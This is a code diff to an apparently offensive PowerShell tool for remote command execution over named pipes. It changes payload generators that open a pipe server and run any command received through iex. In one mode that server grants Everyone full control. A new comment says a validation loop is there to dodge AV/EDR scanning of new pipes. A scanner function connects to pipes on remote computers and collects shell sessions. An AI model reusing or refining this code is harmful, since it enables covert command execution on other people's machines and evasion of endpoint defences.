@@ -184,6 +184,11 @@ function New-PayloadScript {
             "`$$vPipe.Close();`$$vPipe.Dispose()"
         )
     } else {
+        # pipeSetup creates the pipe, reader, writer, then loops WaitForConnection with a
+        # 2-second read timeout to reject phantom connections (AV/EDR scanning newly created
+        # named pipes). After a real client sends the first command, $vCmd is populated and
+        # the validation loop exits. $vCb flags that the first command is already in $vCmd
+        # so the main loop skips the initial ReadLine().
         $pipeSetup = (
             "`$$vSec=New-Object System.IO.Pipes.PipeSecurity;" +
             "`$$vSid=New-Object System.Security.Principal.SecurityIdentifier '$SID';" +
@@ -191,16 +196,15 @@ function New-PayloadScript {
             "`$$vSec.AddAccessRule(`$$vAr);" +
             "`$$vT=$serverType;" +
             "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName','InOut',1,'Byte','None',$bufSize,$bufSize,`$$vSec;" +
-            "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
-            "`$$vPipe.WaitForConnection();" +
-            "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
             "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
-            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe)"
+            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
+            "while(`$true){`$$vPipe.WaitForConnection();try{`$$vTm=`$$vRd.ReadLineAsync();if(`$$vTm.Wait(2000)-and`$null-ne`$$vTm.Result){`$$vCmd=`$$vTm.Result;break}}catch{};`$$vPipe.Disconnect()}"
         )
         $loop = (
+            "`$$vCb=`$true;" +
             "while(`$true){if(-not `$$vPipe.IsConnected){break};" +
-            "`$$vCmd=`$$vRd.ReadLine();" +
-            "if(`$$vCmd -eq 'exit'){break};" +
+            "if(`$$vCb){`$$vCb=`$false}else{`$$vCmd=`$$vRd.ReadLine()};" +
+            "if(`$$vCmd -eq 'exit'-or`$null -eq `$$vCmd){break};" +
             "$moduleHandler;" +
             "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
             "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
@@ -2028,14 +2032,14 @@ function Print-MultiListener {
 	$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
 	
 	if($global:Detach){
-		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
-	
-		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
+		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"S-1-1-0`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tc=`$ps.WaitForConnectionAsync();if(-not `$tc.Wait(600000)){`$ps.Close();exit};`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
+
+		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""S-1-1-0"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tc=`$pS.WaitForConnectionAsync();if(-not `$tc.Wait(600000)){`$pS.Close();exit};`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
 	}
 	else{
-		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
-	
-		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""$SID"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
+		$ServerScript="`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sd);`$tc=`$ps.WaitForConnectionAsync();if(-not `$tc.Wait(600000)){`$ps.Close();exit};`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"$($global:EndMarker)`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose()"
+
+		$RawServerScript="`$sD=New-Object System.IO.Pipes.PipeSecurity;`$sU=New-Object System.Security.Principal.SecurityIdentifier ""$SID"";`$aR=New-Object System.IO.Pipes.PipeAccessRule(`$sU,""FullControl"",""Allow"");`$sD.AddAccessRule(`$aR);`$pS=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',$($global:BufferSize),$($global:BufferSize),`$sD);`$tc=`$pS.WaitForConnectionAsync();if(-not `$tc.Wait(600000)){`$pS.Close();exit};`$sr=New-Object System.IO.StreamReader(`$pS);`$sw=New-Object System.IO.StreamWriter(`$pS);while(`$true){if(-not `$pS.IsConnected){break};`$cmd=`$sr.ReadLine();if(`$cmd-eq""exit""){break}else{try{`$res=iex ""`$cmd 2>&1 | Out-String"";`$res -split ""`u{000A}"" | % {`$sw.WriteLine(`$_.TrimEnd())}}catch{`$err=`$_.Exception.Message;`$err-split""`u{000D}`u{000A}"" | % {`$sw.WriteLine(`$_)}};`$sw.WriteLine(""$($global:EndMarker)"");`$sw.Flush()}};`$pS.Disconnect();`$pS.Dispose()"
 	}
 	
 	$PwshRawServerScript = $RawServerScript
@@ -2204,32 +2208,30 @@ function Scan-WaitingTargets{
 
     $runspaces = @()
 
+    $endMarker = $global:EndMarker
+
     foreach ($Computer in $FinalTargets) {
         $psRunspace = [powershell]::Create().AddScript({
-            param($Computer, $PipeName)
+            param($Computer, $PipeName, $EndMarker)
 
-            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Computer", $PipeName, 'InOut')
-            $pipeClient.Connect(100)
-            
-            if (!$pipeClient.IsConnected) { return $null }
+            try { $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$Computer", $PipeName, 'InOut') } catch { return $null }
+            try { $pipeClient.Connect(500) } catch { $pipeClient.Dispose(); return $null }
+
+            if (!$pipeClient.IsConnected) { $pipeClient.Dispose(); return $null }
 
             $sr = New-Object System.IO.StreamReader($pipeClient)
             $sw = New-Object System.IO.StreamWriter($pipeClient)
-			
-			$sw.WriteLine("whoami")
-			$sw.Flush()
-			
-			$whoamiInfo = ""
-			
-			while ($true) {
-				$line = $sr.ReadLine()
-				if ($line -eq $global:EndMarker) {
-					#$whoamiInfo = $whoamiInfo.Trim()
-					break
-				} elseif ($whoamiInfo -eq "") {
-					$whoamiInfo = $line.Trim()
-				}
-			}
+
+            $sw.WriteLine("whoami")
+            $sw.Flush()
+
+            $whoamiInfo = ""
+
+            while ($true) {
+                $line = $sr.ReadLine()
+                if ($null -eq $line -or $line -eq $EndMarker) { break }
+                if ($whoamiInfo -eq "") { $whoamiInfo = $line.Trim() }
+            }
 
             return [PSCustomObject]@{
                 'PipeName'     = $PipeName
@@ -2237,10 +2239,10 @@ function Scan-WaitingTargets{
                 'StreamReader' = $sr
                 'StreamWriter' = $sw
                 'ComputerName' = $Computer
-				'UniquePipeID' = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
-				'UserID' = $whoamiInfo
+                'UniquePipeID' = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_}) -join ''
+                'UserID'       = $whoamiInfo
             }
-        }).AddArgument($Computer).AddArgument($PipeName)
+        }).AddArgument($Computer).AddArgument($PipeName).AddArgument($endMarker)
 
         $psRunspace.RunspacePool = $runspacePool
 
